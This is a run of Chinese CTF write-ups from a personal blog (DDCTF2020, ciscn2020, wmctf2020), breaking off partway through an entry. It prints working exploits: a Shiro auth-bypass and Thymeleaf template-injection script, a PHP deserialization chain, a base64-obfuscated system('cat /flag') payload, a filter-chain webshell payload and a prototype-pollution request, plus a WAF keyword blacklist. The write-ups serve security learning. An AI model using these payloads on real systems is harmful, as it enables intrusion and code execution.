Web</h2><p>第一次熬夜杠题，真爽</p><p>登陆失败后响应体出现：<code>RememberMe=DeleteMe</code>，shiro稳了</p><p>尝试一下Shiro 反序列化，果然GG</p><p><a href="https://shiro.apache.org/security-reports.html" target="_blank" rel="noopener">https://shiro.apache.org/security-reports.html</a></p><p>去官网看下CVE，试一下发现存在CVE-2020-11989</p><p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index</a></p><p>绕过权限验证，发现任意文件读取接口</p><p><code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg</code></p><p>（原本是想直接读取Shiro的key来直接打穿的，搞了好久都没找到）</p><p>常规思路：</p><ol><li><p>先读取 web.xml</p><pre><code class="xml">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;version=&quot;3.0&quot; metadata-complete=&quot;false&quot;&gt;  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;  &lt;context-param&gt;    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;    &lt;param-value&gt;classpath:spring-core.xml&lt;/param-value&gt;  &lt;/context-param&gt;  &lt;listener&gt;    &lt;listener-class&gt;org.springframework.web.util.WebAppRootListener&lt;/listener-class&gt;  &lt;/listener&gt;  &lt;listener&gt;    &lt;listener-class&gt;org.springframework.web.util.IntrospectorCleanupListener&lt;/listener-class&gt;  &lt;/listener&gt;  &lt;listener&gt;    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;  &lt;/listener&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;      &lt;param-value&gt;classpath:spring-web.xml&lt;/param-value&gt;    &lt;/init-param&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;filter&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;encoding&lt;/param-name&gt;      &lt;param-value&gt;UTF-8&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;      &lt;param-name&gt;forceEncoding&lt;/param-name&gt;      &lt;param-value&gt;true&lt;/param-value&gt;    &lt;/init-param&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/filter-mapping&gt;  &lt;filter&gt;    &lt;filter-name&gt;safeFilter&lt;/filter-name&gt;    &lt;filter-class&gt;com.ctf.util.SafeFilter&lt;/filter-class&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;safeFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/filter-mapping&gt;  &lt;filter&gt;    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;      &lt;param-value&gt;true&lt;/param-value&gt;    &lt;/init-param&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/filter-mapping&gt;  &lt;error-page&gt;    &lt;error-code&gt;500&lt;/error-code&gt;    &lt;location&gt;/error.jsp&lt;/location&gt;  &lt;/error-page&gt;  &lt;error-page&gt;    &lt;error-code&gt;404&lt;/error-code&gt;    &lt;location&gt;/hacker.jsp&lt;/location&gt;  &lt;/error-page&gt;  &lt;error-page&gt;    &lt;error-code&gt;403&lt;/error-code&gt;    &lt;location&gt;/hacker.jsp&lt;/location&gt;  &lt;/error-page&gt;&lt;/web-app&gt;</code></pre></li><li><p>依次读取class文件：<br><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class</a></p><pre><code class="java">package com.ctf.util;import java.io.IOException;import java.util.Enumeration;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletResponse;public class SafeFilter  implements Filter{  private final String encoding = &quot;UTF-8&quot;;  private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;, &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };  public void init(FilterConfig arg0)    throws ServletException  {}  public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)    throws IOException, ServletException  {    request.setCharacterEncoding(&quot;UTF-8&quot;);    response.setCharacterEncoding(&quot;UTF-8&quot;);    Enumeration pNames = request.getParameterNames();    while (pNames.hasMoreElements())    {      String name = (String)pNames.nextElement();      String value = request.getParameter(name);      for (String blacklist : blacklists)      {        Matcher matcher = Pattern.compile(blacklist, 34).matcher(value);        if (matcher.find())        {          HttpServletResponse servletResponse = (HttpServletResponse)response;          servletResponse.sendError(403);        }      }    }    filterChain.doFilter(request, response);  }  public void destroy() {}}</code></pre><p>然后其他的被waf过滤了<br>读取web.xml中的其他配置文件</p><p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml</a></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;xmlns:p=&quot;http://www.springframework.org/schema/p&quot;xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;xmlns:context=&quot;http://www.springframework.org/schema/context&quot;xmlns:jee=&quot;http://www.springframework.org/schema/jee&quot;xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;xsi:schemaLocation=&quot;http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsdhttp://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsdhttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsdhttp://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsdhttp://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd&quot;&gt;  &lt;import resource=&quot;classpath:spring-shiro.xml&quot; /&gt;  &lt;!-- 声明自动为spring容器中那些配置@Aspectj切面的bean创建代理，织入切面 --&gt;  &lt;aop:aspectj-autoproxy&gt;&lt;/aop:aspectj-autoproxy&gt;  &lt;!-- 支持事物注解（@Transactional） --&gt;  &lt;tx:annotation-driven/&gt;  &lt;bean id=&quot;viewResolver&quot; class=&quot;org.thymeleaf.spring4.view.ThymeleafViewResolver&quot;&gt;    &lt;property name=&quot;order&quot; value=&quot;1&quot;/&gt;    &lt;property name=&quot;characterEncoding&quot; value=&quot;UTF-8&quot;/&gt;    &lt;property name=&quot;templateEngine&quot; ref=&quot;templateEngine&quot;/&gt;  &lt;/bean&gt;  &lt;bean id=&quot;templateEngine&quot; class=&quot;org.thymeleaf.spring4.SpringTemplateEngine&quot;&gt;    &lt;property name=&quot;templateResolver&quot; ref=&quot;templateResolver&quot; /&gt;  &lt;/bean&gt;  &lt;bean id=&quot;templateResolver&quot; class=&quot;org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver&quot;&gt;    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/templates/&quot;/&gt;    &lt;property name=&quot;suffix&quot; value=&quot;.html&quot;/&gt;    &lt;property name=&quot;templateMode&quot; value=&quot;HTML5&quot;/&gt;    &lt;property name=&quot;cacheable&quot; value=&quot;false&quot;/&gt;    &lt;property name=&quot;characterEncoding&quot;  value=&quot;UTF-8&quot; /&gt;  &lt;/bean&gt;  &lt;context:annotation-config /&gt;  &lt;context:component-scan base-package=&quot;com.ctf&quot;&gt;    &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Service&quot; /&gt;    &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Repository&quot; /&gt;  &lt;/context:component-scan&gt;&lt;/beans&gt;</code></pre><p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml</a></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;xmlns:context=&quot;http://www.springframework.org/schema/context&quot;xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;  &lt;!-- 自动扫描 Controller 包 --&gt;  &lt;context:component-scan base-package=&quot;com.ctf.controller&quot;/&gt;  &lt;context:component-scan base-package=&quot;com.ctf.repository&quot;/&gt;  &lt;context:component-scan base-package=&quot;com.ctf.service&quot;/&gt;  &lt;!-- 注解配置和乱码处理 --&gt;  &lt;mvc:annotation-driven&gt;    &lt;mvc:message-converters&gt;      &lt;bean class=&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt;        &lt;constructor-arg value=&quot;UTF-8&quot;/&gt;      &lt;/bean&gt;    &lt;/mvc:message-converters&gt;  &lt;/mvc:annotation-driven&gt;  &lt;mvc:default-servlet-handler/&gt;&lt;/beans&gt;</code></pre><p>猜测他们的Auth，Login等对应的Controller类名<br><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class</a></p></li></ol><p>   <a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class</a></p><p>   拿到Admin的路由：<code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index</code>，同样权限绕过<br>   发现提示Render，盲猜又是SSTI</p><p>   检测JAVA的SSTI发现<code>[[${7*7}]]</code>成功执行，这是一个Thymeleaf 模板注入</p><p>进入下一步SSTI</p><p>ctfFilter过滤了：</p><pre><code class="java">private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;, &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };</code></pre><p>利用Thymeleaf 特性绕过</p><p><code>[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]]</code></p><p>exp:</p><pre><code class="python">import requestsimport reimport gen#  private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, # &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, # &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;,#  &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };code = &quot;param.foo&quot;payload =&#39;&#39;&#39;&lt;p th:text=${%s}&gt;&lt;/p&gt;&#39;&#39;&#39;%codecmd=payloadcmd=&quot;&quot;&quot;[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]] &quot;&quot;&quot;print(cmd)burp0_url = &quot;http://116.85.37.131:80/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://116.85.37.131&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}burp0_data = {&quot;content&quot;: cmd}response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data).texttry:    redirect = re.search(&#39;fetch \./(.*) !&#39;, response).group(1)except :    print(response)url = &#39;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/&#39;url += redirectprint(requests.get(url,params={&quot;foo&quot;:&quot;NEW java.util.Scanner(NEW java.i@o.BufferedRea@der(new java.i@o.Fi@leRe@ad@er(new java.i@o.Fi@le(&quot;+gen.gen(&quot;/flag_is_here&quot;)+&quot;)))).nextLine()&quot;,&quot;bbb&quot;:&#39;@&#39;,&quot;t&quot;:&quot;&quot;,&#39;g&#39;:&#39;ls&#39;},proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text)</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/09/07/DDCTF2020/">https://www.ccreater.top/2020/09/07/DDCTF2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf,wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2020预选赛</title>
      <link href="2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/"/>
      <url>2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p><pre><code class="php">&lt;?phpnamespace DB{    abstract class Cursor  implements \IteratorAggregate {}}namespace DB\SQL{    class Mapper extends \DB\Cursor{        protected            $props=[&quot;quotekey&quot;=&gt;&quot;phpinfo&quot;],            $adhoc=[-1=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],            $db;        function offsetExists($offset){}        function offsetGet($offset){}        function offsetSet($offset, $value){}        function offsetUnset($offset){}        function getIterator(){}        function __construct($val){            $this-&gt;db = $val;        }    }}namespace CLI{    class Agent {        protected            $server=&quot;&quot;;        public $events;        public function __construct(){            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];            $this-&gt;server=&amp;$this;        }    };    class WS{}}namespace {    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));}</code></pre><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p><p>fork子进程执行的代码是：</p><pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre><p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p><pre><code class="php">&lt;?php    $payloads=[        &quot;ls&quot;,//shell命令执行测试        &quot;index.php&quot;,//读取文件测试        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试        &quot;echo 123;&quot;//php命令执行测试    ];    $str=file_get_contents(&quot;fatalerr.log&quot;);    if(!$str){        $str=&quot;[]&quot;;    }    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);    function show_result($func,$r,$v){        if($r==NULL){        }        try{            echo &quot;$func($v,false,true) return value:&quot;;            var_dump($r);            echo &quot;&lt;br /&gt;&quot;;        }catch(Exception $e){}    }    function brute_func($a){        global $payloads;        global $fatalerror;        foreach($a as $val){            if(is_array($val)){                brute_func($val);                continue;            }            if(in_array($val,$fatalerror)){                continue;            }            array_push($fatalerror,$val);            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));            foreach($payloads as $v){                $r=NULL;                $r=call_user_func_array($val,[$v,false,true]);                show_result($val,$r,$v);            }            array_pop($fatalerror);        }    };    $arr=get_defined_functions();    brute_func($arr);?&gt;</code></pre><p>多次执行发现：</p><pre><code class="php">stream_socket_serverexecstream_socket_client</code></pre><p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p><p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p><h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p><p>很简单利用字符串拼接绕过</p><p><code>{if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)}{end+if}</code></p><h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p><pre><code class="php">&lt;?phpclass trick{    public $trick1;    public $trick2;}$t = new trick;$t-&gt;trick1 = &quot;INF&quot;;$t-&gt;trick2 = 1e1111;echo serialize($t);</code></pre><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><pre><code>λ npm audit                       === npm audit security report ===# Run  npm update set-value --depth 1  to resolve 1 vulnerability  High            Prototype Pollution  Package         set-value  Dependency of   set-value  Path            set-value  More info       https://npmjs.com/advisories/1012found 1 high severity vulnerability in 61 scanned packages  run `npm audit fix` to fix 1 of them.</code></pre><p>原型链污染，poc地址：<br><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><ul><li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li><li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li><li>最后访问<code>/DeveloperControlPanel</code>拿flag</li></ul><pre><code>POST /Privilege HTTP/1.1Host: hostContent-Type: application/x-www-form-urlencodedCookie: session=yoursessionNewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4POST /DeveloperControlPanel HTTP/1.1Host: hostContent-Type: application/x-www-form-urlencodedCookie: session=yoursessionkey=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/08/21/ciscn2020预选赛/">https://www.ccreater.top/2020/08/21/ciscn2020预选赛/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2020easyphp出题笔记</title>
      <link href="2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
      <url>2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="easyphp出题笔记"><a href="#easyphp出题笔记" class="headerlink" title="easyphp出题笔记"></a>easyphp出题笔记</h1><p>这题原意是想让大家写脚本来fuzz来发现CUFA/CUF中对引用处理不恰当而造成的崩溃，特意禁止了pcntl可是由于没有认真测试，忘记了还有CUF这个函数，结果有人直接绕过了。</p><p>出题人想干的事情就是我们不让他干成就是对这种情况的最好解释。最后看到自己的题目被解成那样，我也是自闭了。</p><p>继续正题吧。</p><h2 id="来由"><a href="#来由" class="headerlink" title="来由"></a>来由</h2><p>之所以会出现这题是因为前段时间的wmctf的webweb反序列化出有这样一处的利用点，我为了找到合适的函数就采取fuzz，东西没发现倒是发现php崩溃了。</p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>直接去看<a href="https://bugs.php.net/bug.php?id=79979" target="_blank" rel="noopener">bugs.php</a> 上面的，会不会是因为交到bugs.php上的原因导致这么多人解了？</p><h2 id="原解"><a href="#原解" class="headerlink" title="原解"></a>原解</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p><p>fork子进程执行的代码是：</p><pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre><p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p><pre><code class="php">&lt;?php    $payloads=[        &quot;ls&quot;,//shell命令执行测试        &quot;index.php&quot;,//读取文件测试        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试        &quot;echo 123;&quot;//php命令执行测试    ];    $str=file_get_contents(&quot;fatalerr.log&quot;);    if(!$str){        $str=&quot;[]&quot;;    }    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);    function show_result($func,$r,$v){        if($r==NULL){        }        try{            echo &quot;$func($v,false,true) return value:&quot;;            var_dump($r);            echo &quot;&lt;br /&gt;&quot;;        }catch(Exception $e){}    }    function brute_func($a){        global $payloads;        global $fatalerror;        foreach($a as $val){            if(is_array($val)){                brute_func($val);                continue;            }            if(in_array($val,$fatalerror)){                continue;            }            array_push($fatalerror,$val);            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));            foreach($payloads as $v){                $r=NULL;                $r=call_user_func_array($val,[$v,false,true]);                show_result($val,$r,$v);            }            array_pop($fatalerror);        }    };    $arr=get_defined_functions();    brute_func($arr);?&gt;</code></pre><p>多次执行发现：</p><pre><code class="php">stream_socket_serverexecstream_socket_client</code></pre><p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码，但是这里我禁用了exec所以我们用另外两个函数引起segment fault查看phpinfo，在phpinfo中找到flag。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望有师傅有不同的解可以留个言啥的谢谢啦</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/08/21/ciscn2020easyphp出题笔记/">https://www.ccreater.top/2020/08/21/ciscn2020easyphp出题笔记/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> 出题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wmctf2020</title>
      <link href="2020/08/04/wmctf2020/"/>
      <url>2020/08/04/wmctf2020/</url>
      
        <content type="html"><![CDATA[<h1 id="wmctf-2020"><a href="#wmctf-2020" class="headerlink" title="wmctf 2020"></a>wmctf 2020</h1><p>u1s1，这次比赛质量很高</p><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><pre><code>&lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#39;content&#39;])) {    $content = $_GET[&#39;content&#39;];    if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))         die(&#39;hacker&#39;);    if(file_exists($content))        require_once($content);    file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);}</code></pre><p>这题就很简单，因为flag就在/flag，直接包含拿到flag</p><h2 id="web-checkin2"><a href="#web-checkin2" class="headerlink" title="web_checkin2"></a>web_checkin2</h2><p>这题就很有意思了，搞了整整一天</p><p>一样的代码</p><pre><code class="php">&lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;HTTP_X_REAL_IP&#39;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#39;content&#39;])) {    $content = $_GET[&#39;content&#39;];    if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))         die(&#39;hacker&#39;);    if(file_exists($content))        require_once($content);    file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);}</code></pre><p>这次flag不在/flag，所以我们需要命令执行</p><p>因为这个php版本是7.0.33所以<code>string.strip_tags</code>这个过滤器不能用，不然的话可以利用这样的payload:<code>php://filter/write=string.strip_tags|dechunk/resource=%3f&gt;%31%0a%3c%0a%32%36%0a%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%65%78%69%74%3b</code></p><p>为啥不能用嘞，因为7.0.33版本有个bug，用<code>string.strip_tags</code>会出现segment fault</p><p>后来我就想到了，利用segment fault，php不会删除临时文件，所以就上传文件，然后爆破文件名，但是后来题目弄了个提醒：<code>no brute force</code> 心态裂开</p><p>于是我们得找其他的方法，</p><p>这下彻底没招了，只能去看源代码了，在分析代码的时候发现：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200802191228.png" 